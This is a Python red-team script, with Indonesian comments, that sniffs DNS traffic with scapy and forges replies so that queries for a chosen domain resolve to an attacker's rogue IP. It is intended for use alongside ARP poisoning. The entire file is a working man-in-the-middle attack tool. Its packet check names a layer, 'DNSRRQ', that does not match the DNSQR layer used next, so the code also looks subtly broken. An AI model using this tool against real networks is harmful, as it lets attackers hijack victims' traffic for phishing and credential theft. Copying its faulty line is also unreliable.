#!/usr/bin/env python3
"""
DNS Spoofing Module
Description: Advanced Layer 7 MITM tool to redirect DNS queries to a rogue IP.
To be used in conjunction with ARP Poisoning.
"""

import scapy.all as scapy
import argparse
import logging
import sys

# Konfigurasi Logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S')

def show_banner():
    banner = """
       ___  _  _ ___   ___                     __ 
      |   \\| \\| / __| / __| _ __  ___  ___  / _|
      | |) | .` \\__ \\ \\__ \\| '_ \\/ _ \\/ _ \\|  _|
      |___/|_|\\_|___/ |___/| .__/\\___/\\___/|_|  
                           |_|                  
    ================================================
    [+] Advanced DNS Spoofing Module (Red Team)
    [+] Created by : Haykal Azriel Priatama
    ================================================
    """
    print(banner)

def get_arguments():
    parser = argparse.ArgumentParser(description="Mengarahkan domain target ke IP berbahaya (Rogue IP).")
    parser.add_argument("-d", "--domain", dest="domain", required=True, help="Domain yang akan di-spoof (misal: target.com)")
    parser.add_argument("-r", "--rogue", dest="rogue_ip", required=True, help="IP tujuan palsu (IP mesin attacker)")
    return parser.parse_args()

def process_packet(packet, target_domain, rogue_ip):
    """Mencegat DNS Request dan membuat DNS Response palsu."""
    # Mengecek apakah paket memiliki layer DNS Request (DNSQR)
    if packet.haslayer(scapy.DNSRRQ):
        qname = packet[scapy.DNSQR].qname.decode("utf-8")
        
        # Jika domain yang dicari korban cocok dengan target kita
        if target_domain in qname:
            logging.info(f"[*] Mencegat permintaan DNS untuk: {qname}")
            logging.info(f"[+] Mengirim respons palsu -> {rogue_ip}")
            
            # Membuat jawaban DNS palsu
            answer = scapy.DNSRR(rrname=qname, rdata=rogue_ip)
            
            # Merakit ulang paket dari Layer 3 (IP) hingga Layer 7 (DNS)
            # Kita tukar source/destination agar paket kembali ke korban
            spoofed_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src) / \
                             scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport) / \
                             scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, an=answer)
            
            # Mengirim paket spoofing
            scapy.send(spoofed_packet, verbose=False)

def main():
    show_banner()
    options = get_arguments()
    
    target_domain = options.domain
    rogue_ip = options.rogue_ip
    
    logging.info(f"Menunggu DNS Request untuk '{target_domain}'...")
    logging.info(f"Korban akan diarahkan ke Rogue IP: {rogue_ip}")
    logging.info("Tekan CTRL+C untuk menghentikan.")
    
    try:
        # Sniffing paket UDP port 53 (DNS)
        # prn: memanggil fungsi process_packet untuk setiap paket yang ditangkap
        scapy.sniff(filter="udp port 53", prn=lambda x: process_packet(x, target_domain, rogue_ip), store=False)
    except KeyboardInterrupt:
        print("\n")
        logging.info("Menghentikan DNS Spoofer.")
        sys.exit(0)

if __name__ == "__main__":
    main()